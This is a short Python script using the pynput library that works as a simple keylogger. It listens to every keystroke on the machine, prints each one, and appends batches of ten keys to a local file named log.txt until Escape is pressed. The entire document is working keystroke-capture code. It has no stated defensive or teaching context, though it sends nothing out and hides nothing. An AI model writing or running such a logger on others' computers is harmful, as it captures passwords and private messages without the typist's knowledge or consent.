import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []


def OnPress(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        WriteFile(keys)
        keys = []


def WriteFile(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")

            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


def OnRelease(key):
    if key == Key.esc:
        return False


with Listener(on_press=OnPress, on_release=OnRelease) as listener:
    listener.join()
